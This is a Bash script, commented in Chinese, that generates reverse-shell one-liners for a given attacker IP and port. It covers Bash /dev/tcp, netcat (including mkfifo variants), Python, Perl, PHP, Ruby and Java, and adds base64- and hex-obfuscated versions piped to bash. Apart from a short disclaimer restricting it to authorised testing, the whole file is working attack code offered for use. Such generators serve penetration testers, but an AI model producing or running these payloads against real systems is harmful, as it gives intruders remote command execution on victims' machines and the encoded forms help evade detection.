#!/bin/bash
# ============================================================
# reverse_shell.sh - 反向 Shell 生成器
# 用法: ./reverse_shell.sh <攻击机IP> <攻击机端口> [类型]
#
# 免责声明：本脚本仅供学习和授权测试使用。
# 未经授权使用本脚本进行攻击属于违法行为。
# ============================================================

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# 免责声明
echo -e "${RED}==================== 免责声明 ====================${NC}"
echo -e "${RED}本脚本仅供学习和授权渗透测试使用。${NC}"
echo -e "${RED}未经授权使用本脚本进行攻击属于违法行为。${NC}"
echo -e "${RED}================================================${NC}"
echo ""

# 参数检查
if [ $# -lt 2 ]; then
    echo "用法: $0 <攻击机IP> <攻击机端口> [类型]"
    echo ""
    echo "支持的反向 Shell 类型:"
    echo "  bash    - Bash 反向 Shell (默认)"
    echo "  nc      - Netcat 反向 Shell"
    echo "  python  - Python 反向 Shell"
    echo "  perl    - Perl 反向 Shell"
    echo "  php     - PHP 反向 Shell"
    echo "  ruby    - Ruby 反向 Shell"
    echo "  java    - Java 反向 Shell"
    echo "  all     - 显示所有类型"
    echo ""
    echo "示例: $0 192.168.1.100 4444"
    echo "示例: $0 10.0.0.1 9999 python"
    exit 1
fi

ATTACKER_IP="$1"
ATTACKER_PORT="$2"
SHELL_TYPE="${3:-bash}"

echo "========================================"
echo "  反向 Shell 生成器"
echo "========================================"
echo -e "攻击机 IP: ${YELLOW}$ATTACKER_IP${NC}"
echo -e "攻击机端口: ${YELLOW}$ATTACKER_PORT${NC}"
echo -e "Shell 类型: ${GREEN}$SHELL_TYPE${NC}"
echo "========================================"
echo ""

# 监听提示
echo -e "${CYAN}[提示] 在攻击机上运行以下命令监听:${NC}"
echo "  nc -lvnp $ATTACKER_PORT"
echo ""

# 生成各种反向 Shell
generate_bash_shell() {
    local ip=$1
    local port=$2
    echo -e "${GREEN}[Bash 反向 Shell]${NC}"
    echo "  bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo ""
    echo "  # 另一种写法:"
    echo "  0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
    echo ""
}

generate_nc_shell() {
    local ip=$1
    local port=$2
    echo -e "${GREEN}[Netcat 反向 Shell]${NC}"
    echo "  nc -e /bin/sh $ip $port"
    echo ""
    echo "  # mkfifo 版本 (无 -e 参数时使用):"
    echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
    echo ""
    echo "  # /dev/tcp 版本:"
    echo "  mknod /tmp/backpipe p"
    echo "  /bin/sh 0</tmp/backpipe | nc $ip $port 1>/tmp/backpipe"
    echo ""
}

generate_python_shell() {
    local ip=$1
    local port=$2
    echo -e "${GREEN}[Python 反向 Shell]${NC}"
    cat << PYEOF
  python -c 'import socket,subprocess,os;
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  s.connect(("$ip",$port));
  os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);
  p=subprocess.call(["/bin/sh","-i"]);'
PYEOF
    echo ""
    echo "  # Python 3 版本:"
    cat << PYEOF
  python3 -c 'import socket,subprocess,os;
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  s.connect(("$ip",$port));
  os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);
  p=subprocess.run(["/bin/sh","-i"]);'
PYEOF
    echo ""
}

generate_perl_shell() {
    local ip=$1
    local port=$2
    echo -e "${GREEN}[Perl 反向 Shell]${NC}"
    cat << PERLEOF
  perl -e 'use Socket;\$i="$ip";\$p=$port;
  socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
  if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){
  open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
  exec("/bin/sh -i");};'
PERLEOF
    echo ""
}

generate_php_shell() {
    local ip=$1
    local port=$2
    echo -e "${GREEN}[PHP 反向 Shell]${NC}"
    cat << PHPEOF
  php -r '\$sock = fsockopen("$ip", $port);
  exec("/bin/sh -i <&3 >&3 2>&3");'
PHPEOF
    echo ""
    echo "  # 另一种写法:"
    cat << PHPEOF
  php -r '\$s = fsockopen("$ip", $port);
  \$descriptorspec = array(0 => \$s, 1 => \$s, 2 => \$s);
  \$process = proc_open("/bin/sh -i", \$descriptorspec, \$pipes);'
PHPEOF
    echo ""
}

generate_ruby_shell() {
    local ip=$1
    local port=$2
    echo -e "${GREEN}[Ruby 反向 Shell]${NC}"
    cat << RUBYEOF
  ruby -rsocket -e 'exit if fork;
  c=TCPSocket.new("$ip",$port);
  while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
RUBYEOF
    echo ""
}

generate_java_shell() {
    local ip=$1
    local port=$2
    echo -e "${GREEN}[Java 反向 Shell]${NC}"
    cat << JAVAEOF
  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$ip/$port;
  cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
  p.waitFor()
JAVAEOF
    echo ""
}

# 生成加密/混淆版本
generate_encoded_shell() {
    local ip=$1
    local port=$2
    
    echo -e "${GREEN}[编码/混淆版本]${NC}"
    echo ""
    
    # Base64 编码的 bash shell
    bash_shell="bash -i >& /dev/tcp/$ip/$port 0>&1"
    encoded=$(echo -n "$bash_shell" | base64 -w 0 2>/dev/null || echo -n "$bash_shell" | base64 2>/dev/null)
    echo "  Base64 编码 Bash:"
    echo "    echo '$encoded' | base64 -d | bash"
    echo ""
    
    # 十六进制编码
    hex_encoded=$(echo -n "$bash_shell" | xxd -p | tr -d '\n' 2>/dev/null)
    if [ -n "$hex_encoded" ]; then
        echo "  十六进制 Bash:"
        echo "    echo '$hex_encoded' | xxd -r -p | bash"
        echo ""
    fi
}

# 根据类型生成
case "$SHELL_TYPE" in
    bash)
        generate_bash_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    nc|netcat)
        generate_nc_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    python)
        generate_python_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    perl)
        generate_perl_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    php)
        generate_php_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    ruby)
        generate_ruby_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    java)
        generate_java_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    all)
        generate_bash_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        generate_nc_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        generate_python_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        generate_perl_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        generate_php_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        generate_ruby_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        generate_java_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        generate_encoded_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    encoded)
        generate_encoded_shell "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
    *)
        echo -e "${RED}[错误] 不支持的类型: $SHELL_TYPE${NC}"
        exit 1
        ;;
esac

echo "========================================"
echo -e "  ${YELLOW}请仅在授权环境中使用${NC}"
echo "========================================"
